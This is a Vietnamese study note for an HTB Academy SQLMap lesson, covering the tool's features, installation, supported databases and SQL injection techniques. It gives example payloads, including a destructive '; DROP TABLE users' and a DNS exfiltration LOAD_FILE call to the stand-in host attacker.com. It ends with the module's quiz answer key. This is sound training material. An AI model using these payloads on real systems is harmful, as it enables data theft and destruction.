# Tổng Quan Về SQLMap (SQLMap Overview)

> **HTB Academy Module 58: SQLMap Essentials - Section 1 / 11**  
> *Đường dẫn bài học: `01-getting-started/01-sqlmap-overview.md`*

---

## 1. Giới Thiệu SQLMap Là Gì?

[SQLMap](https://github.com/sqlmapproject/sqlmap) là một công cụ kiểm thử xâm nhập (Penetration Testing) mã nguồn mở và hoàn toàn miễn phí được viết bằng ngôn ngữ **Python**. Công cụ này tự động hóa quy trình phát hiện (detection) và khai thác (exploitation) các lỗ hổng tiêm mã SQL (**SQL Injection - SQLi**). 

SQLMap được phát triển liên tục từ năm 2006 bởi Bernardo Damele A. G. và Miroslav Stampar, cho đến nay vẫn là công cụ khai thác SQLi mạnh mẽ, toàn diện và phổ biến nhất trong thế giới An ninh mạng thực chiến.

```console
shellsession BreakHerHeart@htb[/htb]$ python sqlmap.py -u 'http://inlanefreight.htb/page.php?id=5'
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.3.10.41#dev}
|_ -| . [']     | .'| . |
|___|_   ["]_|_|_|__,|  _|
      |_|...            |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 12:55:56

[12:55:56] [INFO] testing connection to the target URL
[12:55:57] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
[12:55:58] [INFO] testing if the target URL content is stable
[12:55:58] [INFO] target URL content is stable
[12:55:58] [INFO] testing if GET parameter 'id' is dynamic
[12:55:58] [INFO] confirming that GET parameter 'id' is dynamic
[12:55:59] [INFO] GET parameter 'id' is dynamic
[12:55:59] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
[12:56:00] [INFO] testing for SQL injection on GET parameter 'id'
<...SNIP...>
```

---

## 2. Các Tính Năng Cốt Lõi Của SQLMap

SQLMap sở hữu một công cụ nhận diện lỗ hổng cực kỳ mạnh mẽ cùng với rất nhiều tùy chọn nâng cao hỗ trợ pentester tinh chỉnh mọi khía cạnh của cuộc tấn công:

* **Kết nối mục tiêu (Target connection)**: Hỗ trợ cấu hình HTTP proxy, Tor, custom headers, User-Agent giả lập, cookie xác thực, timeout, retry.
* **Nhận diện điểm tiêm (Injection detection)**: Kiểm tra tự động các tham số GET, POST, HTTP Headers (Cookie, User-Agent, Referer, Host).
* **Định danh hệ quản trị CSDL (Fingerprinting)**: Tự động phát hiện phiên bản và loại DBMS đang chạy phía sau ứng dụng web.
* **Thu thập thông tin CSDL (Enumeration)**: Trích xuất tên cơ sở dữ liệu, bảng (tables), cột (columns), người dùng, mật khẩu băm (hashes), đặc quyền (privileges).
* **Tối ưu hóa hiệu năng (Optimization)**: Hỗ trợ đa luồng (multi-threading), nén dữ liệu HTTP để tăng tốc độ khai thác.
* **Vượt rào WAF/IPS bằng Tamper Scripts**: Sử dụng hàng chục script biến đổi payload (URL-encoding, base64, comment nesting) để bypass tường lửa ứng dụng web.
* **Truy xuất nội dung CSDL (Database content retrieval)**: Dump toàn bộ dữ liệu hoặc trích xuất từng trường dữ liệu mong muốn.
* **Truy cập hệ thống tệp tin (File system access)**: Đọc file tùy ý trên máy chủ web (`--file-read`) hoặc tải file mã độc lên máy chủ (`--file-write`).
* **Thực thi lệnh hệ điều hành (OS command execution)**: Mở shell tương tác trực tiếp trên hệ điều hành của máy chủ đích (`--os-shell`, `--os-cmd`).

---

## 3. Cài Đặt SQLMap

SQLMap được cài đặt sẵn trên Parrot OS, Kali Linux, Pwnbox và phần lớn các bản phân phối Linux bảo mật.

### Cài đặt qua APT (Debian/Ubuntu):
```bash
sudo apt install sqlmap
```

### Cài đặt thủ công bản mới nhất từ GitHub:
```bash
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
cd sqlmap-dev
python sqlmap.py
```

---

## 4. Các Hệ Quản Trị Cơ Sở Dữ Liệu Được Hỗ Trợ (Supported DBMSes)

SQLMap là công cụ hỗ trợ số lượng DBMS lớn nhất hiện nay:
* **Các DBMS phổ biến hàng đầu**: MySQL, Oracle, PostgreSQL, Microsoft SQL Server (MSSQL), SQLite, MariaDB.
* **Các DBMS doanh nghiệp & di sản**: IBM DB2, Microsoft Access, Firebird, Sybase, SAP MaxDB, Informix.
* **Các DBMS phân tán & hiện đại**: CockroachDB, TiDB, MemSQL, HSQLDB, H2, MonetDB, Apache Derby, Amazon Redshift, Vertica, Mckoi, Presto, Altibase, MimerSQL, CrateDB, Greenplum, Drizzle, Apache Ignite, Cubrid, InterSystems Cache, IRIS, eXtremeDB, FrontBase.

---

## 5. Sáu Kỹ Thuật SQL Injection Được Hỗ Trợ (`BEUSTQ`)

SQLMap hỗ trợ đầy đủ tất cả các kỹ thuật SQLi được chuẩn hóa. Bạn có thể xem danh sách kỹ thuật bằng cờ `sqlmap -hh`:

```console
shellsession BreakHerHeart@htb[/htb]$ sqlmap -hh
...SNIP...
  Techniques:
    --technique=TECH..  SQL injection techniques to use (default "BEUSTQ")
```

Chuỗi ký tự **`BEUSTQ`** đại diện cho 6 kỹ thuật:

```
[B] - Boolean-based blind
[E] - Error-based
[U] - UNION query-based
[S] - Stacked queries
[T] - Time-based blind
[Q] - Inline queries
```

---

### Chi Tiết Từng Kỹ Thuật:

#### 1. `B` - Boolean-based blind SQL Injection
* **Ví dụ Payload**: `AND 1=1` hoặc `AND 1=2`
* **Nguyên lý hoạt động**: Kẻ tấn công trích xuất dữ liệu bằng cách so sánh kết quả **ĐÚNG (TRUE)** hoặc **SAI (FALSE)** từ phản hồi của máy chủ web. Mỗi request chỉ thu được 1 bit thông tin. Để đọc được 1 ký tự (1 byte), thông thường cần gửi từ **7 đến 8 HTTP requests**.
* **Đặc điểm**:
  * Kết quả `TRUE`: Phản hồi của server hầu như không khác biệt hoặc có nội dung trang bình thường.
  * Kết quả `FALSE`: Phản hồi của server khác biệt rõ rệt (thiếu nội dung, mã lỗi HTTP khác, trang rỗng).
  * Đây là loại SQLi phổ biến nhất trên các ứng dụng web thực tế.

#### 2. `E` - Error-based SQL Injection
* **Ví dụ Payload**: `AND GTID_SUBSET(@@version,0)`
* **Nguyên lý hoạt động**: Nếu máy chủ hiển thị chi tiết thông báo lỗi của CSDL lên màn hình khi câu truy vấn bị sai cú pháp, kẻ tấn công sẽ ép database kích hoạt một lỗi có chứa dữ liệu cần đánh cắp ngay trong thông báo lỗi đó.
* **Đặc điểm**:
  * Rất nhanh, mỗi request có thể lấy được một "chunk" dữ liệu (khoảng 200 bytes).
  * Nhanh hơn hầu hết các loại khác, chỉ đứng sau kỹ thuật **UNION query-based**.
  * Hỗ trợ trên: MySQL, PostgreSQL, Oracle, MSSQL, Sybase, Vertica, IBM DB2, Firebird, MonetDB.

#### 3. `U` - UNION query-based SQL Injection (NHANH NHẤT)
* **Ví dụ Payload**: `UNION ALL SELECT 1,@@version,3`
* **Nguyên lý hoạt động**: Kẻ tấn công mở rộng câu truy vấn gốc bằng toán tử `UNION`, nối kết quả của câu truy vấn độc hại vào kết quả ban đầu. Dữ liệu đánh cắp sẽ được render trực tiếp lên giao diện trang web.
* **Đặc điểm**:
  * **ĐÂY LÀ LOẠI SQL INJECTION NHANH NHẤT (Fastest SQLi Type)**.
  * Trong điều kiện lý tưởng, kẻ tấn công có thể kéo toàn bộ nội dung của một bảng cơ sở dữ liệu chỉ bằng **MỘT REQUEST DUY NHẤT** (`single request`).

#### 4. `S` - Stacked queries (Piggy-backing)
* **Ví dụ Payload**: `; DROP TABLE users`
* **Nguyên lý hoạt động**: Tiêm thêm một câu truy vấn hoàn toàn mới đằng sau dấu chấm phẩy (`;`) nối tiếp câu truy vấn ban đầu.
* **Đặc điểm**:
  * Cho phép thực thi các lệnh phi truy vấn (non-query statements) như `INSERT`, `UPDATE`, `DELETE`, hoặc thực thi các thủ tục nâng cao gọi lệnh OS (như `xp_cmdshell` trên MSSQL).
  * Phụ thuộc vào nền tảng: Microsoft SQL Server và PostgreSQL mặc định hỗ trợ stacked queries, trong khi MySQL / PHP mặc định thường chặn kỹ thuật này.

#### 5. `T` - Time-based blind SQL Injection
* **Ví dụ Payload**: `AND 1=IF(2>1,SLEEP(5),0)`
* **Nguyên lý hoạt động**: Tương tự như Boolean-based blind, nhưng thay vì dựa vào nội dung trang trả về, kẻ tấn công đo **thời gian phản hồi (response time)** của server để suy đoán TRUE hay FALSE.
  * Nếu câu điều kiện là TRUE: Server sẽ bị hoãn (sleep/wait) trong số giây được chỉ định (ví dụ trễ 5 giây).
  * Nếu câu điều kiện là FALSE: Server phản hồi lại ngay lập tức.
* **Đặc điểm**:
  * Đây là loại **chậm nhất** trong tất cả các kỹ thuật vì mỗi bit dữ liệu đều phải chờ thời gian delay.
  * Là giải pháp "cứu cánh" cuối cùng khi ứng dụng web không trả về lỗi và cũng không thay đổi nội dung trang web khi truy vấn đúng/sai (như trong các câu lệnh `INSERT`, `UPDATE`).

#### 6. `Q` - Inline queries
* **Ví dụ Payload**: `SELECT (SELECT @@version) from`
* **Nguyên lý hoạt động**: Nhúng một câu truy vấn con bên trong câu truy vấn gốc. Kỹ thuật này ít gặp hơn vì đòi hỏi ứng dụng web phải được viết theo cấu trúc logic cụ thể.

---

## 6. Kỹ Thuật Nâng Cao: Out-of-band SQL Injection (OOB / DNS Exfiltration)

* **Ví dụ Payload**: `LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'))`
* **Nguyên lý hoạt động**:
  * Khi tất cả các kỹ thuật trên bị chặn hoặc quá chậm (như Time-based blind), SQLMap có thể ép database thực hiện một kết nối mạng ra ngoài máy chủ DNS do kẻ tấn công kiểm soát.
  * SQLMap cấu hình một máy chủ DNS giả lập cho tên miền (ví dụ `.attacker.com`). Database mục tiêu khi truy vấn tên miền sẽ gửi kèm dữ liệu truy vấn trong subdomain (ví dụ `5.7.34-MySQL.attacker.com`). SQLMap lắng nghe các DNS query này để khôi phục toàn bộ dữ liệu.

---

## 7. Checkpoint & Câu Hỏi Ôn Luyện (HTB Academy)

### Bảng Tổng Hợp Đáp Án Checkpoint

| STT | Câu Hỏi (HTB Academy) | Phương Pháp Phân Tích & Đối Chiếu | Đáp Án Điền Hệ Thống |
| :---: | :--- | :--- | :---: |
| **Q1** | *What's the fastest SQLi type?* | UNION query-based cho phép kéo toàn bộ bảng CSDL chỉ trong 1 request duy nhất | **`UNION query-based`** |

---
*Edit by me and AI.*
